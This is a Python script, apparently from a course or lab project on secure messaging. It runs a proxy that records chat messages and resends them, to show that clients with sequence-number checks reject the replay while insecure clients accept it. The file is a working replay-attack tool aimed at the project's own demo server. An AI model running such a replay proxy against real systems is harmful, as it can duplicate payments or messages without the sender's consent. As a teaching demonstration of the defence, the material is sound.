"""
replay_attack.py - ATTACK 2: replay a captured message
-------------------------------------------------------
The attacker can't read or forge messages, but it can RECORD one and send the
exact same bytes again later ("pay 100 to bob" ... and again ... and again).

    secure clients    -> seq number already used -> REPLAY_OR_REORDER, rejected
    --insecure clients-> no seq check -> the duplicate is shown as a new message

Run (server + clients with --no-tls, clients pointing at port 9100):
    python -m attacks.replay_attack --listen 9100 --server-port 9000 --copies 2 --delay 2
"""

import asyncio

from attacks.proxy_base import RED, YELLOW, AttackProxy, common_args, run, say


class ReplayProxy(AttackProxy):
    name = "REPLAY"

    def __init__(self, *args, copies=1, delay=2.0):
        super().__init__(*args)
        self.copies = copies
        self.delay = delay

    async def on_client_frame(self, conn, envelope):
        if envelope.get("type") == "CHAT":
            say(YELLOW, f"[REPLAY] captured CHAT {conn.username} -> {envelope.get('to')}, "
                        f"will resend it {self.copies}x in {self.delay}s")
            asyncio.create_task(self.replay_later(conn, dict(envelope)))
        return [envelope]  # the original goes through untouched

    async def replay_later(self, conn, envelope):
        await asyncio.sleep(self.delay)
        for i in range(self.copies):
            say(RED, f"[REPLAY] resending captured message (copy {i + 1})")
            await conn.to_server(envelope)


def main():
    parser = common_args("Replay attack proxy (demo only)")
    parser.add_argument("--copies", type=int, default=1)
    parser.add_argument("--delay", type=float, default=2.0)
    args = parser.parse_args()
    run(ReplayProxy(args.listen, args.server_host, args.server_port,
                    copies=args.copies, delay=args.delay))


if __name__ == "__main__":
    main()
